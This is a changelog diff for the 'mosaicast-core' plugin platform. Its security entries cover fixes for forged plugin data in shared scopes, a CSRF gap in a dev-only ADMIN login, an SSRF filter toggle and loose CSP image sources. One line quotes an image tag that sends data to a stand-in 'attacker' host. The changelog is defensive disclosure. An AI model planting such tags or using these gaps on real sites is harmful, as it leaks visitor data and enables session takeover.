@@ -14,6 +14,53 @@ All notable changes to **mosaicast-core** are documented here. The format follow
 
 ### Security
 
+- **A plugin's backend can reserve the keys it authors (`0.6.0`, §7.2/§7.6).** Authorization on the doc store
+  is per *plugin*, not per *document*. The floors say who may write; nothing said which key, so every caller
+  above `writableBy` could overwrite or delete any shared-scope key — a value the plugin's own backend
+  computed included, because the host cannot tell a scheduled write from a `curl`. A security audit
+  demonstrated it against the bundled sample: a podcaster `PUT` a forged site-wide aggregate, it was served
+  to every visitor, and then they deleted it. The plugin was not misconfigured — it declared
+  `readableBy: anonymous`, `writableBy: podcaster`, both did exactly what they say, and there was no way to
+  express "this key is the backend's".
+  - The manifest declares `"data": { "backendOwned": ["stats", "agg:*"] }` — an exact key, a `*`-terminated
+    prefix, or the bare `*`. A client `PUT`/`DELETE` to a matching key is **403**; **reads are untouched**
+    and still governed by `readableBy`, since the point is to publish a value, not to hide it.
+  - Its own problem type, **`problems/backend-owned-key`**, distinct from the role-floor
+    `problems/forbidden`. The two refusals have opposite fixes — raise the floor, or stop writing the key
+    from the client — so an author who cannot tell them apart is stuck. The role floor is still checked
+    first: `data` is not in the public manifest, so a caller *below* the floor learns nothing about which
+    keys it names.
+  - **`ctx.store()` is unaffected.** Enforcement is HTTP-side only; the `DocStore` interface did not change.
+  - **Ignored for `USER` scopes**, even under a bare `*`: a backend cannot write a partition there at all, so
+    reserving one would reserve it for nobody and lock its owner out of their own data.
+  - Matching is by key, case-sensitive, across every shared scope — one declaration covers an aggregate at
+    site level and a counter at episode level. A malformed entry **rejects the plugin at load** rather than
+    being dropped, because a dropped entry loads a plugin whose manifest claims a key is the backend's while
+    the host enforces nothing.
+  - It does **not** remove a value a client wrote before the declaration existed, so write your computed keys
+    in `register(ctx)` as well as on a schedule — otherwise a forged document survives until the next tick.
+  - **Requires SDK 0.6.0** (`platformApi` 0.6.x).
+  - **Still open:** everything else in a shared scope has no owner, so one podcaster can overwrite another's
+    plugin data. Binding a shared document to its author needs an ownership concept the domain model does not
+    have; until then, reserve the key or keep the data in `USER` scope.
+- **`POST /api/auth/dev-login` is CSRF-protected like every other mutation (`0.6.0`).** It was exempt under
+  the `dev` profile, on the reasoning that the endpoint only exists there — but a dev instance is where a
+  session is worth the most, since dev-login mints an ADMIN one on request with no password to phish. A
+  cross-site page could drop a developer's own browser into a Dev ADMIN session. The SPA already sent the
+  header on every unsafe method, so the exemption bought nothing.
+- **`mosaicast.feed.allow-private-targets` needs a second key (`0.6.0`).** It disables the SSRF egress filter
+  entirely and did so with a WARN nobody reads. With it on and
+  `mosaicast.feed.allow-private-targets-confirmed` off, **the app refuses to start**. One variable is too
+  easy to set while chasing something else and leave behind, and the failure is silent — everything keeps
+  working, and the only difference is that the filter is gone.
+- **CSP image and media sources can be narrowed (`0.6.0`, §12.5).** `img-src 'self' data: https:` allows an
+  image from any host, so `<img src="https://attacker/p.gif?d=…">` is a working one-way exfiltration and
+  tracking channel — past `connect-src 'self'` and past consent, which gates script/frame/connect and never
+  touched this. `mosaicast.security.strict-media-sources` replaces the blanket with the origins the site's
+  content actually references (derived from feed and episode artwork/audio, refreshed every fifteen minutes)
+  plus the plugin hosts this visitor consented to; `mosaicast.security.extra-media-sources` covers what a
+  derivation cannot see. **Off by default** — artwork comes from whatever host a feed points at, and
+  narrowing too far shows a blank tile rather than an error.
 - **Per-user plugin data is no longer reachable by anyone but its owner (`0.6.0`, §7.4/§7.6).** The doc store
   had no notion of *whose* a document was: `scopeType`, `scopeId` and `key` were all client input, the only
   gate was a per-plugin role floor, and scope ids are public slugs — so any caller above that floor could
@@ -31,7 +78,7 @@ All notable changes to **mosaicast-core** are documented here. The format follow
     `DocStore` methods throw `UnsupportedOperationException` — reads included, since resolving "me" without a
     caller means picking someone. Aggregates go through the new backend-only `queryAcrossUsers`, which names
     each owner and has no HTTP surface.
-  - **Requires SDK 0.5.0** (`platformApi` 0.5.x). Existing per-user data stays in whatever keys hold it —
+  - **Requires SDK 0.6.0** (`platformApi` 0.6.x). Existing per-user data stays in whatever keys hold it —
     the host cannot know a plugin's key convention — so plugins migrate it themselves.
 - **A plugin's data surface declares its own access floors (`0.6.0`, §7.2).** They were derived from slot
   `visibleTo`, taking the *minimum* across all slots as the read floor, so a plugin with one anonymous display
